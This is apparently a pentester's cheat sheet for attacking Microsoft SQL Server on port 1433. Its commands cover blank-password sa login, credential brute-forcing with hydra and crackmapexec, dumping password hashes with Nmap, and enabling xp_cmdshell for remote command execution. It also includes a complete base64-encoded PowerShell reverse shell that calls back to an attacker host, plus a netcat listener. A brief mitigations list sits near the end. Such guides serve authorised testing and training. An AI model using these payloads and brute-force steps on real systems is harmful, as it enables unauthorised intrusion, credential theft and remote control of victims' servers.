# Port 1433 - MSSQL

Microsoft SQL Server (MSSQL) is a relational database management system widely used in enterprise environments. Improper configurations or exposed services can make it a target for attackers.



## Techniques

Detailed techniques for MSSQL enumeration using the tools above.

### Service Detection

Identify if MSSQL is running on the target and its version.

{% code title="Nmap" %}
```bash
nmap -p 1433 -sV <IP>
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <IP>
run
```
{% endcode %}

### Anonymous MSSQL Login

Test for access using default or blank credentials.

{% code title="sqsh" %}
```bash
sqsh -S <IP> -U sa -P ""
```
{% endcode %}

{% code title="mssqlclient.py Script" %}
```bash
python mssqlclient.py sa@<IP>
```
{% endcode %}

{% code title="Nmap" %}
```bash
nmap --script ms-sql-empty-password -p1433 IP
```
{% endcode %}



### Enumerate Databases

List all available databases.

{% code title="mssqlclient.py Script" %}
```bash
python mssqlclient.py <username>:<password>@<IP>
> SELECT name FROM sys.databases;
```
{% endcode %}

{% code title="sqlcmd" %}
```bash
sqlcmd -S <IP> -U <username> -P <password>
> SELECT name FROM sys.databases;
```
{% endcode %}

### Enumerate Users and Roles

Identify MSSQL users and their permissions.

{% code title="mssqlclient.py Script" %}
```bash
python mssqlclient.py <username>:<password>@<IP>
> SELECT name, type_desc FROM sys.server_principals;
```
{% endcode %}

{% code title="sqlcmd" %}
```bash
sqlcmd -S <IP> -U <username> -P <password>
> SELECT name, type_desc FROM sys.server_principals;
```
{% endcode %}

{% code title="Nmap" overflow="wrap" %}
```bash
nmap --script ms-sql-query --script-args mssql.username=USER,mssql.password=PASS,ms-sql-query.query="SELECT * FROM master..syslogins" -p1433 <IP> -oN output.txt

# Dump user hashes
nmap --script ms-sql-dump-hashes --script-args mssql.username=USER,mssql.password=PASS -p1433 <IP>
```
{% endcode %}



### Brute-Force MSSQL Credentials

Test for weak or default credentials.

{% code title="hydra" %}
```bash
hydra -L users.txt -P passwords.txt mssql://<IP>
```
{% endcode %}

{% code title="crackmapexec" %}
```bash
crackmapexec mssql <IP> -u users.txt -p passwords.txt
```
{% endcode %}

{% code title="Nmap" overflow="wrap" %}
```bash
nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 IP
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/scanner/mssql/mssql_login
```
{% endcode %}



### Remote Command Execution

Check if `xp-cmdshell` is enable:

{% code title="SQL command" %}
```sql
EXEC sp_configure 'xp_cmdshell';
```
{% endcode %}

Tool for sql connection:

{% code title="Nmap" overflow="wrap" %}
```bash
nmap --script ms-sql-xp-cmdshell --script-args mssql.username=USER,mssql.password=PASS,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 <IP>
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/admin/mssql/mssql_exec
```
{% endcode %}

{% code title="sqlcmd" %}
```bash
sqlcmd -S <DC_IP> -U <username> -P <password> -Q "EXEC xp_cmdshell 'whoami';"
```
{% endcode %}

{% code title="Impacket's script" %}
```bash
./mssqlclient.py <user>:<password>@<IP>
```
{% endcode %}





### Query System Information

Extract detailed system and configuration information.

{% code title="mssqlclient.py Script" %}
```bash
python mssqlclient.py <username>:<password>@<DC_IP>
> SELECT @@version;
> SELECT name, collation_name FROM sys.databases;
```
{% endcode %}

***

## Public MSSQL Vulnerabilities

### Searchsploit

Test if MSSQL version is vulnerable and there is some public exploit about it.

```bash
searchsploit mssql <VERSION>
```



### XP\_CMDSHELL Misuse

Abuses the `xp_cmdshell` feature to execute OS commands and get RevShell.

Verify if xp\_cmdshell is enabled:

```sql
EXEC sp_configure 'xp_cmdshell';
```

Connect to the MSSQL service and make queries to enable the setting:

{% code title="mssqclient.py Script" %}
```bash
python mssqlclient.py <username>:<password>@<IP>
```
{% endcode %}

{% code title="SQL" %}
```sql
> enable_xp_cmdshell
> xp_cmdshell 'whoami'
```
{% endcode %}

Execute a rev shell: Powershell #3 (base64)

{% embed url="https://www.revshells.com/" %}

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

{% code title="xp_cmdshell revshell" overflow="wrap" %}
```sql
> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxADcAIgAsADkAMAAwADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
{% endcode %}

{% code title="Listener for RevShell" %}
```bash
nc -lnvp <PORT>
```
{% endcode %}



***

## Mitigations

* Disable unused features like `xp_cmdshell`.
* Use firewalls to restrict access to port 1433.
* Regularly patch and update MSSQL instances.
* Enforce strong password policies and account lockouts.
* Implement least privilege principles for database users.

***

## Tools

### sqsh

Iteract with MSSQL databases.

{% code title="Installation" %}
```bash
sudo apt install sqsh
```
{% endcode %}



### sqlcmd

Native Microsoft command-line utility for managing MSSQL.

{% code title="Installation" %}
```bash
sudo apt install mssql-tools
```
{% endcode %}

### Nmap

Identify MSSQL services and run MSSQL-related scripts.

{% code title="Installation" %}
```bash
sudo apt install nmap
```
{% endcode %}

{% code title="Available scripts" %}
```bash
ls /usr/share/nmap/scripts | grep ms-sql
```
{% endcode %}

{% code title="Commands" %}
```bash
nmap --script ms-sql-info -p1433 <IP>
nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 <IP>
```
{% endcode %}



### Metasploit

Pre-installed in Kali Linux; otherwise, download from:

{% embed url="https://www.metasploit.com/" %}

{% code title="Commands" %}
```bash
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```
{% endcode %}



### Impacket suite

{% code title="installation" %}
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```
{% endcode %}

{% code title="Kali location" %}
```bash
/usr/share/doc/python3-impacket/examples/
```
{% endcode %}

#### MSSQL script

* `mssqlclient.py`: For connecting to and querying MSSQL servers.

### Hydra

Brute-force MSSQL credentials.

{% code title="Installation" %}
```bash
sudo apt install hydra
```
{% endcode %}

### CrackMapExec

Automates MSSQL enumeration and exploitation.

```bash
sudo apt install crackmapexec
```

{% embed url="https://www.kali.org/tools/crackmapexec/" %}

daw























